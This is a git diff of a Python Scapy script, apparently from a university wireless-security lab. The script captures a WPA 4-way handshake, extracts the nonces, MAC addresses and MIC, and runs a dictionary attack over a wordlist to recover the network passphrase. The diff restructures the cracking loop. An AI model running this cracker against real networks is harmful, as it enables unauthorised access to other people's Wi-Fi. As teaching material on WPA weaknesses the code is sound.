@@ -46,8 +46,6 @@ if len(sys.argv) != 5:
     print("4 argument: Interface")
     exit()
 
-# Read the passphrase from the file wordlist
-
 
 # Array to store the Authenticator nonce and the Supplicant nonce
 global nonces
@@ -68,44 +66,37 @@ mic_to_test = ""
 ssid = sys.argv[1]
 
 def pkt_callback(pkt):
+
+    # Read the passphrase from the file wordlist
+    passPhrases = open("wordlist","r").read().split("\n")  
+
+    A = "Pairwise key expansion" #this string is used in the pseudo-random function
+
+    #cf "Quelques détails importants" dans la donnée
+    data = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")
+
     if pkt.haslayer(EAPOL) :
 
         pktList.append(pkt)
 
         if(len(pktList) == 4):
-            passPhrase = f.readline()
-            while(passPhrase != ""):
-                nonces.append(pktList[0].getlayer(Raw).load.hex()[26:90])
-                nonces.append(pktList[1].getlayer(Raw).load.hex()[26:90])
+            # Authenticator and Supplicant Nonces
+            # We transform them to the correct encoding
+            ANonce      = a2b_hex(pktList[0].getlayer(Raw).load.hex()[26:90])
+            SNonce      = a2b_hex(pktList[1].getlayer(Raw).load.hex()[26:90])
 
-                APmac = a2b_hex((pktList[0][Dot11].addr3).replace(":",""))
-                Clientmac = a2b_hex((pktList[0][Dot11].addr1).replace(":", ""))
+            APmac = a2b_hex((pktList[0][Dot11].addr3).replace(":",""))
+            Clientmac = a2b_hex((pktList[0][Dot11].addr1).replace(":", ""))
 
-                mic_to_test = pktList[3].getlayer(Raw).load.hex()[154:-4]
+            # This is the MIC contained in the 4th frame of the 4-way handshake
+            # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
+            mic_to_test = pktList[3].getlayer(Raw).load.hex()[154:-4]
+            print("[*] MIC found: " + mic_to_test)
 
-                #if(pkt.getlayer(Raw).load.hex()[25:26] == '0'):  # We want the messages which replay counter is 0
-                #    nonces.append(pkt.getlayer(Raw).load.hex()[26:90])
-                #if(pkt.getlayer(Raw).load.hex()[:6] == '02030a'): # We check if this is the last handshake packet     
-                #    APmac = a2b_hex((pkt[Dot11].addr3).replace(":",""))
-                #    Clientmac = a2b_hex((pkt[Dot11].addr1).replace(":", ""))
-                #    
-                #    mic_to_test = pkt.getlayer(Raw).load.hex()[154:-4]
-                print("[*] MIC found: " + mic_to_test)
+            B = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
 
-                # Important parameters for key derivation - most of them can be obtained from the pcap file
-                A           = "Pairwise key expansion" #this string is used in the pseudo-random function
 
-                # Authenticator and Supplicant Nonces
-                # We transform them to the correct encoding
-                ANonce      = a2b_hex(nonces[0])
-                SNonce      = a2b_hex(nonces[1])
-
-                # This is the MIC contained in the 4th frame of the 4-way handshake
-                # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
-
-                B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
-
-                data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") #cf "Quelques détails importants" dans la donnée
+            for passPhrase in passPhrases :
 
                 # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
                 passPhrase = str.encode(passPhrase)
@@ -122,7 +113,7 @@ def pkt_callback(pkt):
                 if mic.hexdigest()[:len(mic_to_test)] == mic_to_test:
                     print("[*] The passphrase (" + str(passPhrase) + ") is correct")
                     exit()
-                passPhrase = f.readline()
+
             print("[*] The passphrase: " + str(passPhrase) +" is not correct. Try with a different passphrase")
                     
 
